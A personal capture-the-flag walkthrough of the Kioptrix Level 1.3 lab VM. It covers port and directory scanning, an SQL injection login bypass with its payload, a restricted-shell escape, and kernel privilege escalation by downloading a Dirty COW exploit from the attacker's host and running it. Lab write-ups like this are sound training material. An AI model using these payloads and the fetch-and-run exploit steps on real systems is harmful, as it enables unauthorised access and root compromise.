--------------------------------
# Author Shubham Ranpise
--------------------------------

# 12/december/2022

# Kioptrix level 1.3

----------------------------------------------------------------
# nmap scan (got website on port 80)
----------------------------------------------------------------
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

----------------------------------------------------------------
gobuster scan (got 2 usernames for member login form (john,robert))
----------------------------------------------------------------
-> gobuster dir -u http://10.0.2.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 

/member               (Status: 302) [Size: 220] [--> index.php]
/logout               (Status: 302) [Size: 0] [--> index.php]
/images               (Status: 301) [Size: 346] [--> http://10.0.2.10/images/]
/index                (Status: 200) [Size: 1255]
/john                 (Status: 301) [Size: 344] [--> http://10.0.2.10/john/]
/robert               (Status: 301) [Size: 346] [--> http://10.0.2.10/robert/]

----------------------------------------------------------------
# member login form are vulnerable to sql injection
----------------------------------------------------------------
sql query -> ' or 1=1 --
error     -> Warning: mysql_num_rows(): supplied argument is not a valid 
             MySQL result resource in /var/www/checklogin.php on line 28
             Wrong Username or Password

used burp suit intruder for sql injection testing with 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt

sql succesfull with 
user -> robert
pass -> admin' or '1'='1'#

from that we got robert's password 
-> ADGAdsafdfwt4gadfga==

----------------------------------------------------------------
# ssh login (from nmap scan we know port 22 is open for ssh 
             lets try to login with robert password)
----------------------------------------------------------------
add -oHostKeyAlgorithms=+ssh-dss to ssh command 
because this error
-> no matching host key type found. Their offer: ssh-rsa,ssh-dss 
-> ssh -oHostKeyAlgorithms=+ssh-dss robert@10.0.2.10

you got ssh access
but we have limited commands
have to jail break
-> echo os.system('/bin/bash')

----------------------------------------------------------------
# privilege escalation
  (kernel version is vulnerable to dirty cow exploit)
----------------------------------------------------------------
uname -r 
-> 2.6.24-24-server

victim machine dont have gcc so i am using precompiled exploit
-> git clone https://github.com/9emin1/dirtyc0w.git
-> python3 -m http.server 8000     

-> cd /tmp
-> wget http://10.0.2.9:8000/dirtyc0w32 -O exploit
-> chmod +x exploit
-> ./exploit "newpassword"
-> su firefart

you got root

----------------------------------------------------------------
# flag
----------------------------------------------------------------
-> cat /root/congrats.txt

Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret